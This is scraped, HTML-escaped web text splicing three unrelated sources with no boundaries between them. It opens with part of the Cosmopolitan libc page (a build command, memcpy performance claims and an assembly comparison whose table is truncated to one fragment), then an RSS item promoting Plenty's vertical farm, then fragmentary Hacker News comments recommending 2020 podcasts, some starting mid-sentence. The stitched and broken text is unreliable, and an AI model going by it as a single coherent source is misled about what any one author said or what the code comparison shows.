  -Wl,-T,&lt;a href=&quot;https://justine.lol/cosmopolitan/ape.lds&quot;&gt;ape.lds&lt;/a&gt; -include &lt;a href=&quot;https://justine.lol/cosmopolitan/cosmopolitan.h&quot;&gt;cosmopolitan.h&lt;/a&gt; &lt;a href=&quot;https://justine.lol/cosmopolitan/crt.o&quot;&gt;crt.o&lt;/a&gt; &lt;a href=&quot;https://justine.lol/cosmopolitan/ape.o&quot;&gt;ape.o&lt;/a&gt; &lt;a href=&quot;https://justine.lol/cosmopolitan/cosmopolitan.a&quot;&gt;cosmopolitan.a&lt;/a&gt;

&lt;span class=&quot;com&quot;&gt;# ~40kb static binary (can be ~16kb w/ MODE=tiny)&lt;/span&gt;
./hello.com
&lt;/pre&gt;
&lt;p&gt;The above command fixes GCC so it outputs portable binaries that will run on every Linux distro in addition to Mac OS X, Windows NT, FreeBSD, and OpenBSD too. For details on how this works, please read the &lt;a title=&quot;Actually Portable Executable&quot; href=&quot;https://justine.lol/ape.html&quot;&gt;αcτµαlly pδrταblε εxεcµταblε&lt;/a&gt; blog post. This novel binary format is also optional: conventional ELF binaries can be compiled too by removing the &lt;code&gt;-Wl,--oformat=binary&lt;/code&gt; flag.&lt;/p&gt;
&lt;p&gt;Your program will also boot on bare metal too. In other words, you've written a normal textbook C program, and thanks to Cosmopolitan's low-level linker magic, you've effectively created your own operating system which happens to run on all the existing ones as well. Now that's something no one's done before.&lt;/p&gt;

&lt;h3&gt;Performance&lt;/h3&gt;
&lt;p&gt;Cosmopolitan has been optimized by hand for excellent performance on modern desktops and servers. Compared with glibc, you should expect Cosmopolitan to be almost as fast, but with an order of a magnitude tinier code size. Compared with Musl or Newlib, you can expect that Cosmopolitan will generally go much faster, while having roughly the same code size, if not tinier.&lt;/p&gt;
&lt;p&gt;In the case of the most important libc function, memcpy(), Cosmopolitan outperformed every other open source library tested. The chart below shows how quickly memory is transferred depending on the size of the copy. Since it's log scale, each grid square represents a 2x difference in performance. What makes Cosmopolitan so fast here is it uses uses several different memory copying strategies. For small sizes it uses an indirect branch with overlapping moves; for medium sizes it uses simd vectors, and for large copies it uses nontemporal hints which prevent cache thrash. Other libraries usually fall short because they use a one-size-fits-all strategy. For example, Newlib goes 10x slower for the optimal block size (half L1 cache) because it always does nontemporal moves.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://justine.lol/cosmopolitan/memcpy.png&quot;&gt;&lt;img width=&quot;960&quot; height=&quot;540&quot; src=&quot;https://storage.googleapis.com/justine/cosmopolitan/memcpy.png&quot; alt=&quot;memcpy() performance for varying n values&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;Trickle-Down Performance&lt;/h3&gt;
&lt;p&gt;Performing the best on benchmarks isn't enough. Cosmopolitan also uses a second technique that the above benchmark doesn't measure, which we call &quot;trickle-down performance&quot;. For an example of how that works, consider the following common fact about C which is often overlooked. External function calls such as the following:&lt;/p&gt;
&lt;pre&gt;
memcpy(foo, bar, n);
&lt;/pre&gt;
&lt;p&gt;Are roughly equivalent to the following assembly, which leads compilers to assume that most cpu state is clobbered:&lt;/p&gt;
&lt;pre&gt;
&lt;span class=&quot;kwa&quot;&gt;asm volatile&lt;/span&gt;(&lt;span class=&quot;str&quot;&gt;&quot;call memcpy&quot;&lt;/span&gt;
             : &lt;span class=&quot;str&quot;&gt;&quot;=a&quot;&lt;/span&gt;(rax), &lt;span class=&quot;str&quot;&gt;&quot;=D&quot;&lt;/span&gt;(rdi), &lt;span class=&quot;str&quot;&gt;&quot;=S&quot;&lt;/span&gt;(rsi), &lt;span class=&quot;str&quot;&gt;&quot;=d&quot;&lt;/span&gt;(rdx)
             : &lt;span class=&quot;str&quot;&gt;&quot;1&quot;&lt;/span&gt;(foo), &lt;span class=&quot;str&quot;&gt;&quot;2&quot;&lt;/span&gt;(bar), &lt;span class=&quot;str&quot;&gt;&quot;3&quot;&lt;/span&gt;(n)
             : &lt;span class=&quot;str&quot;&gt;&quot;rcx&quot;&lt;/span&gt;, &lt;span class=&quot;str&quot;&gt;&quot;r8&quot;&lt;/span&gt;, &lt;span class=&quot;str&quot;&gt;&quot;r9&quot;&lt;/span&gt;, &lt;span class=&quot;str&quot;&gt;&quot;r10&quot;&lt;/span&gt;, &lt;span class=&quot;str&quot;&gt;&quot;r11&quot;&lt;/span&gt;, &lt;span class=&quot;str&quot;&gt;&quot;memory&quot;&lt;/span&gt;, &lt;span class=&quot;str&quot;&gt;&quot;cc&quot;&lt;/span&gt;,
               &lt;span class=&quot;str&quot;&gt;&quot;xmm0&quot;&lt;/span&gt;, &lt;span class=&quot;str&quot;&gt;&quot;xmm1&quot;&lt;/span&gt;, &lt;span class=&quot;str&quot;&gt;&quot;xmm2&quot;&lt;/span&gt;, &lt;span class=&quot;str&quot;&gt;&quot;xmm3&quot;&lt;/span&gt;, &lt;span class=&quot;str&quot;&gt;&quot;xmm4&quot;&lt;/span&gt;, &lt;span class=&quot;str&quot;&gt;&quot;xmm5&quot;&lt;/span&gt;, &lt;span class=&quot;str&quot;&gt;&quot;xmm6&quot;&lt;/span&gt;);
&lt;/pre&gt;
&lt;p&gt;In other words the compiler assumes that, in calling the function, fifteen separate registers and all memory will be overwritten. See the &lt;a href=&quot;https://www.uclibc.org/docs/psABI-x86_64.pdf&quot;&gt;System V ABI&lt;/a&gt; for further details. This can be problematic for frequently-called functions such as memcpy, since it inhibits many optimizations and it tosses a wrench in the compiler register allocation algorithm, thus causing stack spillage which further degrades performance while bloating the output binary size.&lt;/p&gt;
&lt;p&gt;So what Cosmopolitan does for memcpy() and many other frequently-called core library leaf functions, is defining a simple macro wrapper, which tells the compiler the correct subset of the abi that's actually needed, e.g.&lt;/p&gt;
&lt;pre&gt;
&lt;span class=&quot;ppc&quot;&gt;#define&lt;/span&gt; memcpy(DEST, SRC, N) ({       \
  void *Dest = (DEST);                \
  void *Src = (SRC);                  \
  size_t Size = (N);                  \
  &lt;span class=&quot;kwa&quot;&gt;asm&lt;/span&gt;(&lt;span class=&quot;str&quot;&gt;&quot;call memcpy&quot;&lt;/span&gt;                   \
      : &lt;span class=&quot;str&quot;&gt;&quot;=m&quot;&lt;/span&gt;(*(&lt;span class=&quot;kwa&quot;&gt;char&lt;/span&gt;(*)[Size])(Dest))  \
      : &lt;span class=&quot;str&quot;&gt;&quot;D&quot;&lt;/span&gt;(Dest), &lt;span class=&quot;str&quot;&gt;&quot;S&quot;&lt;/span&gt;(Src), &lt;span class=&quot;str&quot;&gt;&quot;d&quot;&lt;/span&gt;(n),  \
        &lt;span class=&quot;str&quot;&gt;&quot;m&quot;&lt;/span&gt;(*(&lt;span class=&quot;kwa&quot;&gt;char&lt;/span&gt;(*)[Size])(Src))    \
      : &lt;span class=&quot;str&quot;&gt;&quot;rcx&quot;&lt;/span&gt;, &lt;span class=&quot;str&quot;&gt;&quot;xmm3&quot;&lt;/span&gt;, &lt;span class=&quot;str&quot;&gt;&quot;xmm4&quot;&lt;/span&gt;, &lt;span class=&quot;str&quot;&gt;&quot;cc&quot;&lt;/span&gt;); \
    Dest;                             \
  })
&lt;/pre&gt;
&lt;p&gt;What this means, is that Cosmopolitan memcpy() is not simply fast, it also makes unrelated code in the functions that call it faster too as a side-effect. When this technique was first implemented for memcpy() alone, many of the functions in the Cosmopolitan codebase had their generated code size reduced by a third.&lt;/p&gt;
&lt;p&gt;For an example of one such function, consider &lt;code&gt;strlcpy&lt;/code&gt;, which is the BSD way of saying &lt;code&gt;strcpy&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;
&lt;span class=&quot;com&quot;&gt;/**
 * Copies string, the BSD way.
 *
 * &lt;span class=&quot;esc&quot;&gt;@param&lt;/span&gt; d is buffer which needn't be initialized
 * &lt;span class=&quot;esc&quot;&gt;@param&lt;/span&gt; s is a NUL-terminated string
 * &lt;span class=&quot;esc&quot;&gt;@param&lt;/span&gt; n is byte capacity of d
 * &lt;span class=&quot;esc&quot;&gt;@return&lt;/span&gt; strlen(s)
 * &lt;span class=&quot;esc&quot;&gt;@note&lt;/span&gt; d and s can't overlap
 * &lt;span class=&quot;esc&quot;&gt;@note&lt;/span&gt; we prefer memccpy()
 */&lt;/span&gt;
&lt;span class=&quot;kwb&quot;&gt;size_t&lt;/span&gt; strlcpy(&lt;span class=&quot;kwb&quot;&gt;char&lt;/span&gt; *d, &lt;span class=&quot;kwa&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kwb&quot;&gt;char&lt;/span&gt; *s, &lt;span class=&quot;kwb&quot;&gt;size_t&lt;/span&gt; n) {
  &lt;span class=&quot;kwb&quot;&gt;size_t&lt;/span&gt; slen, actual;
  slen = strlen(s);
  if (n) {
    actual = MIN(n - 1, slen);
    memcpy(d, s, actual);
    d[actual] = &lt;span class=&quot;str&quot;&gt;'\0'&lt;/span&gt;;
  }
  &lt;span class=&quot;kwa&quot;&gt;return&lt;/span&gt; slen;
}
&lt;/pre&gt;
&lt;p&gt;If we compile our &lt;code&gt;strlcpy&lt;/code&gt; function, then here's the assembly code that the compiler outputs:&lt;/p&gt;
&lt;table width=&quot;100%&quot; readability=&quot;18.5&quot;&gt;&lt;tr readability=&quot;55.5&quot;&gt;&lt;td width=&quot;50%&quot; valign=&quot;top&quot; readability=&quot;25&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;slc&quot;&gt;/ compiled with traditional libc&lt;/span&gt;
&lt;span class=&quot;lin&quot;&gt;strlcpy&lt;/span&gt;:
        &lt;span class=&quot;kwa&quot;&gt;push&lt;/span&gt;   &lt;span class=&quot;kwc&quot;&gt;%rbp&lt;/span&gt;
        &lt;span class=&quot;kwa&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;kwc&quot;&gt;%rsp&lt;/span&gt;,&lt;span class=&quot;kwc&quot;&gt;%rbp&lt;/span&gt;
        &lt;span class=&quot;kwa&quot;&gt;push&lt;/span&gt;   &lt;span class=&quot;kwc&quot;&gt;%r14&lt;/span&gt;
        &lt;span class=&quot;kwa&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;kwc&quot;&gt;%rsi&lt;/span&gt;,&lt;span class=&quot;kwc&quot;&gt;%r14&lt;/span&gt;
        &lt;span class=&quot;kwa&quot;&gt;push&lt;/span&gt;   &lt;span class=&quot;kwc&quot;&gt;%r13&lt;/span&gt;
        &lt;span class=&quot;kwa&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;kwc&quot;&gt;%rdi&lt;/span&gt;,&lt;span class=&quot;kwc&quot;&gt;%r13&lt;/span&gt;
        &lt;span class=&quot;kwa&quot;&gt;mov&lt;/span&gt;    &lt;span class=&quot;kwc&quot;&gt;%rsi&lt;/span&gt;,&lt;span class=&quot;kwc&quot;&gt;%rdi&lt;/span&gt;
        &lt;span class=&quot;kwa&quot;&gt;push&lt;/span&gt;   &lt;span class=&quot;kwc&quot;&gt;%r12&lt;/span&gt;

        &lt;span class=&quot;kwa&quot;&gt;.endfn&lt;/span&gt; strlcpy,globl
&lt;/pre&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;p&gt;That's a huge improvement in generated code size. The above two compiles used the same gcc flags and no changes to the code needed to be made. All that changed was we used cosmopolitan.h (instead of the platform c library string.h) which contains ABI specialization macros for &lt;code&gt;memcpy&lt;/code&gt; and &lt;code&gt;strlen&lt;/code&gt;. It's a great example of how merely choosing a better C library can systemically eliminate bloat throughout your entire codebase.&lt;/p&gt;

<title>2-Acre Vertical Farm Run by AI and Robots Out-Produces 720-Acre Flat Farm</title>
<link>https://www.intelligentliving.co/vertical-farm-out-produces-flat-farm/</link>
<guid isPermaLink="true" >https://www.intelligentliving.co/vertical-farm-out-produces-flat-farm/</guid>
<description>&lt;p&gt;&lt;a href=&quot;https://www.plenty.ag/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Plenty&lt;/a&gt; is an ag-tech startup in San Francisco, co-founded by Nate Storey, that is reinventing farms and farming. Storey, who is also the company’s chief science officer, says the future of farms is vertical and indoors because that way, the food can grow anywhere in the world, year-round; and the future of farms employ robots and AI to continually improve the quality of growth for fruits, vegetables, and herbs. Plenty does all these things and uses 95% less water and 99% less land because of it.&lt;/p&gt;
&lt;p&gt;In recent years, farmers on flat farms have been using new tools for making farming better or easier. They’re using drones and robots to improve crop maintenance, while artificial intelligence is also on the rise, with over 1,600 startups and total investments reaching tens of billions of dollars. Plenty is one of those startups. However, flat farms still use a lot of water and land, while a Plenty vertical farm can produce the same quantity of fruits and vegetables as a 720-acre flat farm, but on only 2 acres!&lt;/p&gt;
&lt;p&gt;Storey said:&lt;/p&gt;
&lt;div class=&quot;intel-content&quot; id=&quot;intel-1024929738&quot;&gt;&lt;ins class=&quot;adsbygoogle&quot; data-ad-layout=&quot;in-article&quot; data-ad-format=&quot;fluid&quot; data-ad-client=&quot;ca-pub-8782694700958915&quot; data-ad-slot=&quot;4164997562&quot;/&gt; &lt;/div&gt;
&lt;blockquote&gt;
&lt;p&gt;Vertical farming exists because we want to grow the world’s capacity for fresh fruits and vegetables, and we know it’s necessary.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class=&quot;jetpack-video-wrapper&quot;&gt;&lt;span class=&quot;embed-youtube&quot;&gt;&lt;iframe class=&quot;youtube-player&quot; width=&quot;1400&quot; height=&quot;788&quot; src=&quot;https://www.youtube.com/embed/GO0fRU46ZHc?version=3&amp;amp;rel=1&amp;amp;showsearch=0&amp;amp;showinfo=1&amp;amp;iv_load_policy=1&amp;amp;fs=1&amp;amp;hl=en-GB&amp;amp;autohide=2&amp;amp;wmode=transparent&quot; allowfullscreen=&quot;true&quot; sandbox=&quot;allow-scripts allow-same-origin allow-popups allow-presentation&quot;&gt;[embedded content]&lt;/iframe&gt;&lt;/span&gt;&lt;/div&gt;
&lt;p&gt;Plenty’s climate-controlled indoor farm has rows of plants growing vertically, hung from the ceiling. There are sun-mimicking LED lights shining on them, &lt;a href=&quot;https://www.intelligentliving.co/tiny-smart-robots-kill-weeds/&quot;&gt;robots&lt;/a&gt; that move them around, and artificial intelligence (AI) managing all the variables of water, temperature, and light, and continually learning and optimizing how to grow bigger, faster, better crops. These futuristic features ensure every plant grows perfectly year-round. The conditions are so good that the farm produces 400 times more food per acre than an outdoor flat farm.&lt;/p&gt;

&lt;p&gt;Storey said:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;400X greater yield per acre of ground is not just an incremental improvement, and using almost two orders of magnitude less water is also critical in a time of increasing environmental stress and climate uncertainty. All of these are truly game-changers, but they’re not the only goals.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Another perk of vertical farming is locally produced food. The fruits and vegetables aren’t grown 1,000 miles away or more from a city; instead, at a warehouse nearby. Meaning, many transportation miles are eliminated, which is useful for reducing millions of tons of yearly CO2 emissions and prices for consumers. Imported fruits and vegetables are more expensive, so society’s most impoverished are at an extreme nutritional disadvantage. Vertical farms could solve this problem.&lt;/p&gt;
&lt;p&gt;Storey said:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Supply-chain breakdowns resulting from COVID-19 and natural disruptions like this year’s California wildfires demonstrate the need for a predictable and durable supply of products can only come from vertical farming.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Plenty’s farms grow non-GMO crops and don’t use herbicides or pesticides. They recycle all water used, even capturing the evaporated water in the air. The flagship farm in San Francisco is using 100% renewable energy too.&lt;/p&gt;
&lt;p&gt;Furthermore, all the packaging is 100% recyclable, made of recycled plastic, and specially designed to keep the food fresh longer to reduce food waste.&lt;/p&gt;
&lt;p&gt;Storey told &lt;a href=&quot;https://www.forbes.com/sites/johnkoetsier/2020/11/20/this-2-acre-vertical-farm-out-produces-750-acre-flat-farms/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Forbes&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The future will be quite remarkable. And I think the size of the global fresh fruit and vegetable industry will be multiples of what it is today.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Plenty has already received $400 million in investment capital from SoftBank, former Google chairman Eric Schmidt, and Amazon’s Jeff Bezos. It’s also struck a deal with Albertsons stores in California to supply 430 stores with fresh produce.&lt;/p&gt;
&lt;p&gt;Ideally, the company will branch out, opening vertical farms across the country and beyond. There can never be too many places graced by better food growing with a less environmental cost.&lt;/p&gt;

&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;It's about Japan during the second world war and there's something about the absolutely insane Japanese mentality that lead civilians to commit mass suicide that captivated me.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;The whole series, and really the whole of Hardcore History is absolutely amazing and even if you think you don't like history you absolutely should give it a try. Blueprint of Armageddon is still the best piece of entertainment I've ever had, regardless of media.&lt;/span&gt;&lt;/p&gt;

&lt;br/&gt;&lt;div class=&quot;comment&quot;&gt;&lt;span class=&quot;commtext c00&quot;&gt;This is my recommendation as well. I've been listening to these as they have come out. I listened to part 5 on a long car ride recently. The description of the mass suicide after the Battle of Saipan was shocking. Most people today don't know the horrors of Imperial Japan. Most assume there couldn't be such a fanatical, vicious, and atrocity-oriented culture in contemporary times.&lt;/span&gt;

&lt;br/&gt;&lt;div class=&quot;comment&quot;&gt;&lt;span class=&quot;commtext c00&quot;&gt;I'm a big fan too, but beware of his pretty bog standard reading of history. For instance, he makes plenty of insinuations in the Supernova series about how the US basically had to nuke Japan because they were so fanatical.&lt;/span&gt;

&lt;br/&gt;&lt;div class=&quot;comment&quot; readability=&quot;32.203574203574&quot;&gt;&lt;span class=&quot;commtext c00&quot;&gt;TrueAnon podcast episode 100: Brat Camp.&lt;/span&gt;
&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;It's about &quot;therapy boarding schools&quot; or &quot;residential treatment facilities&quot; that purport to help teens with behavioral or emotional issues, drug addiction etc. but often are absolutely horrifying dens of severe child abuse and borderline cult-like brainwashing techniques to get kids in line.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;I can personally attest to the accuracy of their description of what goes on at these places, as I spent 18 months in one of the facilities that they're talking about. In fact, I'd say that Brace Belden didn't even cover some of the most terrible parts. That being said, it's a great intro for the uninitiated.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;Keep in mind that this is kind of a comedy podcast that's highly irreverent and critical of society as a whole, and is often pottymouthed.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;I suggest skipping the first 15 minutes or so, as it's a lot of goofing around before they get to the main topic.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;To clarify, I do not endorse this podcast overall. I don't endorse any podcasts as I rarely listen to any of them. I had a friend suggest this particular episode because she knew about my experiences at this facility and thought I'd find it interesting. This is the only episode of this show that I've ever listened to.&lt;/span&gt;&lt;/p&gt;

When I get into details about that time period I have a tendency to dissociate somewhat, which I've been told by psychiatrists and psychologists is due to PTSD that I developed from the experience.&lt;/span&gt;
&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;I normally do my best not to think about it at all, but the recent Paris Hilton documentary brought a lot of eyeballs to these places which has led to a lot of public discourse. I think that's great, I'm happy that it's not being ignored as much as usual, but there are plenty of other people that would be better suited to educate the public than me.&lt;/span&gt;&lt;/p&gt;

It covered the business model of American trucking company Prime through the story of Kimberly. It was the all too familiar story of employee rights being eroded through a shady business model. Prime were exploiting workers by encouraging them to operate as independent contractors with an exclusive contract whilst also loaning them their truck, setting their rates, assigning their jobs, and asking them to pay for the training they delivered if they left within their first year of operation.&lt;/span&gt;

&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;I find the whole Darknet Diaries podcast really fascinating. It covers topics like hacking (black hat, white hat), activism, hacktivism, cyber security and so forth, with a narrative approach that's very pleasant to listen to. This episode in particular talks about what PSYOP (Psychological Operations) is (basically how to use techniques to manipulate people to reach an outcome both in a war scenario and not) by talking to experts in the field and telling their stories. The episodes are all very good and high quality in my opinion, in fact I'm still working my way through the whole backlog, but I don't have much left already. I picked this one because it left me particularly uncomfortable at the end, while at the same time having taught me something.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;Each episode also lists its sources (of the information, ndr) on the episode page of their website, which I find amazing.&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;&lt;em&gt;HENRY: Psychological operations is a skill set which is used to persuade, change, and influence the behavior of the target audience.&lt;/em&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;&lt;em&gt;JACK: To persuade, change, and influence the behavior of a target audience. To persuade, change, and influence the behavior of a target audience. Huh.&lt;/em&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;&lt;em&gt;HENRY: That could be with your adversary or with your friendly population. The main thing that PSYOP does not do is PSYOP – perform PSYOP on the American public.&lt;/em&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;Sure they don't! This is as reassuring as &quot;The NSA does not wiretap Americans&quot;.&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;From the link below: &quot;What are the police for? Producer B.A. Parker started wondering this back in June, as Black Lives Matter protests and calls to “defund the police” ramped up. The question led her to a wild story of a stabbing on a New York City subway train, and the realization that, according to the law, the police don’t always have to protect us. Producer Sarah Qari joins Parker to dig into the legal background, which takes her all the way up to the Supreme Court... and then all the way back down to on-duty officers themselves.&quot;&lt;/span&gt;&lt;/p&gt;

&lt;br/&gt;&lt;div class=&quot;comment&quot; readability=&quot;14.976&quot;&gt;&lt;span class=&quot;commtext c00&quot;&gt;To me it was the conclusion of a series rather than a single episode: the 5-part &quot;How to duck up an airport&quot; podcast [1] explaining what went wrong with Berlin's long-delayed BER airport published their last episode this year.&lt;/span&gt;
&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;The airport is a master class in how not to plan a project. The airport spent more than 5 times it's budget, it opened 9 years late, and may already be too small. There was talk that they may already be broke, and that was before Corona brought down air traffic to a halt. The podcast goes through everything that went wrong, starting in the early 90s.&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;And this year I found it. I'd always remembered it wasn't a cartoon or live action - but something in between. So it turns out it was the scenes of 'death' from Jim Henson's &quot;The Storyteller&quot;. Just something about the creepy face that did it as a kid. Was definitely a strange sensation to connect it all and see the images anew. Humans/memories/brains are weird.

&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;It's a weekly podcast where two veteran game developers play and discuss games of the past and their relevance today. There's tons of podcasts where random gamers discuss games, but very few that can do a deep dive into the technical aspects. Each game gets discussed for several episodes. It's a fascinating perspective and the two hosts have great chemistry.&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;&quot;In this episode, we review Ali's unemployment, talk about how to talk about workism, and Taimur finally elucidates some concrete ideas about how society treats children immorally, and how we treat children better.&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;This is the first of a two-part discussion about how society short-changes children. I don't agree with all the ideas, but it's certainly changed how I think about children.&lt;/span&gt;&lt;/p&gt;

She made a mini series podcast called Constellation Prize for the Believer magazine this year. I want to say that my favourite episode is &quot;My Year with Franz&quot; where she spends a couple of years listening to Franz Wright's (a poet) recordings which he made in the last years of his life. It is very moving and sad story. However, I am not 100% sure that this qualifies as a 2020 release, since its a re-release of her work and the original was released on 2019.&lt;/span&gt;
&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;However, Crossing Guard (first episode in Constellation Prize) is also very good. It is Bianca interviewing a crossing guard and it gets very existential. I listen to it when I feel lonely.&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span class=&quot;commtext c5a&quot;&gt;I've enjoyed this year's Chapo episode about White Fragility, &quot;No Crying in Raceball&quot;, but it has probably not aged well as the hype about the book has since died down.&lt;/span&gt;&lt;/p&gt;

&lt;/div&gt;

&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;The Bugle: Spready Mercury. I’ve listened to the bugle since 2008 and hearing John oliver on it again gave me hope that there are still good things that can happen in spite of all of the chaos that’s going on in the world right now.&lt;/span&gt;&lt;/p&gt;

&lt;br/&gt;&lt;div class=&quot;comment&quot;&gt;&lt;span class=&quot;commtext c00&quot;&gt;Wow, I was an enthusiastic Bugle listener years ago and it fell off my radar. Zaltzman and Oliver's comedic chemistry is nearly unmatched in podcasting. Going to listen now, thank you for mentioning it!&lt;/span&gt;

&lt;br/&gt;&lt;div class=&quot;comment&quot;&gt;&lt;span class=&quot;commtext c00&quot;&gt;Yes! Darknet diaries. Episode 67 - The Big House, where he gets his mum to break into a prison for him, it was just so well done. Made me want to change careers ;)&lt;/span&gt;
